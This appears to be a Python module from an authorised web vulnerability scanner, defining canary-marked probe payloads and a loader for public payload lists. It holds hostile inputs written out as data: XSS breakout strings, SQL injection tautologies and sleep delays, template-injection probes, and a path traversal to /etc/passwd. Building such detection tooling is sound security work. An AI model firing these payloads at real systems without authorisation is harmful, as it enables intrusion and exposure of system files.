"""A small, curated catalogue of test payloads for authorised testing.

Each payload carries a {m} slot where a per-request random *canary* marker is
substituted, so the oracle can tell *our* reflection from incidental text, and a
payload_class the oracle uses to decide which detector applies. Kept deliberately
compact — this is a detection aid, not an exhaustive exploit arsenal. The point
is to raise a *signal* the brain then has to corroborate, never to auto-claim a
finding.
"""
from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class Payload:
    template: str          # contains {m}; the marker is substituted in
    payload_class: str     # selects the oracle detector
    expected_delay_ms: int = 0   # for time-based probes only


# Marker-only control: establishes where a value is reflected with no special
# characters, so the oracle can compare "plain echo" against "echo with breakout
# characters that survived" — the difference is what matters for XSS.
CONTROL = Payload("{m}", "reflection")

PAYLOADS: list[Payload] = [
    CONTROL,

    # Reflection / XSS context probes: marker plus characters that, if they come
    # back un-encoded, suggest an injectable HTML/JS context. Reflection alone is
    # only a signal; the oracle reports the surrounding context for the brain.
    Payload("{m}'\"<>", "reflection"),
    Payload("{m}</script>", "reflection"),

    # SQLi (error-based): a lone quote and a classic tautology. The oracle looks
    # for database error signatures that appear with the payload but not in the
    # baseline — not for the payload itself.
    Payload("{m}'", "sqli-error"),
    Payload("{m}' OR '1'='1", "sqli-error"),

    # SQLi (time-based): dialect-spread sleeps. Detected only by a reproducible
    # elapsed-time jump close to the injected delay, which the brain is told to
    # re-run before trusting (timing is noisy).
    Payload("{m}' OR SLEEP(5)-- -", "sqli-time", expected_delay_ms=5000),
    Payload("{m}'; WAITFOR DELAY '0:0:5'-- -", "sqli-time", expected_delay_ms=5000),
    Payload("{m}' || pg_sleep(5)-- -", "sqli-time", expected_delay_ms=5000),

    # SSTI: if the engine evaluates it, "49" shows up next to the marker.
    Payload("{m}{{7*7}}", "ssti"),   # Jinja/Twig -> 49
    Payload("{m}${7*7}", "ssti"),    # EL-style   -> 49

    # Path traversal: detected by the /etc/passwd signature in the response.
    Payload("{m}../../../../etc/passwd", "path-traversal"),
]


def payloads_for(classes: list[str] | None = None) -> list[Payload]:
    """All payloads, or only those in the given classes (CONTROL always kept)."""
    if not classes:
        return list(PAYLOADS)
    keep = set(classes)
    return [p for p in PAYLOADS if p.payload_class in keep or p is CONTROL]


def load_payload_file(
    path: str, payload_class: str, expected_delay_ms: int = 0
) -> list[Payload]:
    """Load payloads from a plain-text file — one per line, '#' comments and
    blank lines skipped — and tag them all with payload_class.

    This is the hook for public payload corpora (SecLists, PayloadsAllTheThings):
    you download the lists you want and point the loader at them, so the tool
    ships no exploitation arsenal of its own. A line may contain '{m}' to mark
    where the per-request canary marker goes; lines without it are sent verbatim
    (marker-based reflection detection won't apply to those, but the differential,
    error, and timing detectors still do).
    """
    out: list[Payload] = []
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        for raw in fh:
            line = raw.rstrip("\n")
            if not line.strip() or line.lstrip().startswith("#"):
                continue
            out.append(Payload(template=line, payload_class=payload_class,
                               expected_delay_ms=expected_delay_ms))
    return out
